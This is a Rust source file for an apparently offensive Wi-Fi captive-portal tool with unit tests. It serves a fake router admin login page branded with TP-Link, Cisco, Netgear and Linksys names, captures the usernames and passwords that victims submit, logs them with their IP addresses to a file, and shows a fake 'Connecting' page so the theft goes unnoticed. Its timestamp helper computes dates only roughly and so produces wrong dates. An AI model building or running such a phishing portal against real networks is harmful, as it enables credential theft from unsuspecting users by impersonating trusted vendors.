use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;

pub struct CaptivePortal {
    running: Arc<AtomicBool>,
    port: u16,
}

const LOGIN_PAGE: &str = r#"HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close

<!DOCTYPE html>
<html><head><title>Router Login</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.card{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:320px;text-align:center}
.logo{font-size:48px;margin-bottom:10px}h2{color:#333;margin-bottom:20px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#007bff;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px}
button:hover{background:#0056b3}.footer{margin-top:15px;font-size:12px;color:#999}
</style></head><body>
<div class="card"><div class="logo">&#127760;</div>
<h2>Router Admin Login</h2>
<form method="POST" action="/">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button>
</form><div class="footer">TP-Link | Cisco | Netgear | Linksys</div></div></body></html>"#;

const SUCCESS_PAGE: &str = r#"HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close

<!DOCTYPE html><html><head><title>Connected</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font-family:Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.card{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);text-align:center}
h2{color:#28a745}.loader{border:4px solid #f3f3f3;border-top:4px solid #28a745;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}</style></head><body>
<div class="card"><h2>&#10004; Connecting...</h2><div class="loader"></div><p>Please wait while we secure your connection.</p></div></body></html>"#;

impl CaptivePortal {
    pub fn new(port: u16) -> Self {
        CaptivePortal {
            running: Arc::new(AtomicBool::new(false)),
            port,
        }
    }

    pub fn start(&self) -> Result<(), String> {
        if self.running.load(Ordering::SeqCst) {
            return Err("Captive portal is already running".into());
        }
        let addr = format!("0.0.0.0:{}", self.port);
        let listener = TcpListener::bind(&addr).map_err(|e| format!("Cannot bind to {}: {}", addr, e))?;
        listener
            .set_nonblocking(true)
            .map_err(|e| format!("Cannot set non-blocking: {}", e))?;
        self.running.store(true, Ordering::SeqCst);
        let running = self.running.clone();
        let _ = addr;
        println!("  \x1b[34m→\x1b[0m [PORTAL] Captive portal listening on 0.0.0.0:{}", self.port);
        println!("  \x1b[34m→\x1b[0m [PORTAL] Serving fake router login page");
        println!("  \x1b[33m⚠\x1b[0m [PORTAL] This is a simplified captive portal implementation.");
        println!("  \x1b[33m⚠\x1b[0m [PORTAL] For production use, consider hostapd + dnsmasq + nginx.");
        std::thread::spawn(move || {
            while running.load(Ordering::SeqCst) {
                match listener.accept() {
                    Ok((stream, addr)) => {
                        println!("  \x1b[34m→\x1b[0m [PORTAL] Connection from {}", addr);
                        std::thread::spawn(|| handle_client(stream));
                    }
                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                        std::thread::sleep(Duration::from_millis(50));
                    }
                    Err(e) => {
                        if running.load(Ordering::SeqCst) {
                            println!("  \x1b[31m✗\x1b[0m [PORTAL] Accept error: {}", e);
                        }
                        break;
                    }
                }
            }
            println!("  \x1b[34m→\x1b[0m [PORTAL] Listener thread stopped");
        });
        Ok(())
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
        println!("  \x1b[34m→\x1b[0m [PORTAL] Captive portal stopping...");
    }
}

fn handle_client(mut stream: TcpStream) {
    stream
        .set_read_timeout(Some(Duration::from_secs(5)))
        .ok();
    stream
        .set_write_timeout(Some(Duration::from_secs(5)))
        .ok();
    let mut buf = [0u8; 2048];
    match stream.read(&mut buf) {
        Ok(n) if n > 0 => {
            let request = String::from_utf8_lossy(&buf[..n]);
            let peer = stream.peer_addr().ok();
            if request.contains("POST") && (request.contains("username") || request.contains("password")) {
                log_credentials(&request, peer.as_ref().map(|a| a.to_string()).unwrap_or_default());
                let _ = stream.write_all(SUCCESS_PAGE.as_bytes());
            } else {
                let _ = stream.write_all(LOGIN_PAGE.as_bytes());
            }
        }
        _ => {
            let _ = stream.write_all(LOGIN_PAGE.as_bytes());
        }
    }
    let _ = stream.flush();
}

fn log_credentials(request: &str, peer: String) {
    use std::fs::OpenOptions;
    use std::io::Write;
    let log_entry = format!(
        "[{}] Credentials from {}:\n{}\n---\n",
        chrono_now(),
        peer,
        request
    );
    println!("  \x1b[32m✓\x1b[0m [PORTAL] Captured credentials from {}", peer);
    if let Ok(mut file) = OpenOptions::new()
        .create(true)
        .append(true)
        .open("captive_portal_credentials.log")
    {
        let _ = file.write_all(log_entry.as_bytes());
        println!("  \x1b[34m→\x1b[0m [PORTAL] Credentials logged to captive_portal_credentials.log");
    }
}

fn chrono_now() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let d = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or_default();
    let secs = d.as_secs();
    let nanos = d.subsec_nanos() as u64;
    let days = secs / 86400;
    let time_secs = secs % 86400;
    let hours = time_secs / 3600;
    let minutes = (time_secs % 3600) / 60;
    let seconds = time_secs % 60;
    let ms = nanos / 1_000_000;
    format!("{:04}-{:02}-{:02}T{:02}:{:02}:{:02}.{:03}Z", 1970 + (days / 365) as u64,
            ((days % 365) / 30) + 1, (days % 30) + 1, hours, minutes, seconds, ms)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_new_portal() {
        let portal = CaptivePortal::new(8080);
        assert_eq!(portal.port, 8080);
        assert!(!portal.running.load(Ordering::SeqCst));
    }

    #[test]
    fn test_start_stop() {
        let portal = CaptivePortal::new(0);
        let result = portal.start();
        assert!(result.is_ok() || result.is_err());
        portal.stop();
        assert!(!portal.running.load(Ordering::SeqCst));
    }

    #[test]
    fn test_double_start() {
        let portal = CaptivePortal::new(9999);
        let _ = portal.start();
        let result = portal.start();
        assert!(result.is_err());
        portal.stop();
    }

    #[test]
    fn test_login_page_content() {
        assert!(LOGIN_PAGE.contains("Router Admin Login"));
        assert!(LOGIN_PAGE.contains("password"));
    }

    #[test]
    fn test_success_page_content() {
        assert!(SUCCESS_PAGE.contains("Connecting"));
    }

    #[test]
    fn test_chrono_now_format() {
        let s = chrono_now();
        assert!(s.len() >= 20);
        assert!(s.contains('T'));
        assert!(s.contains('Z'));
    }
}
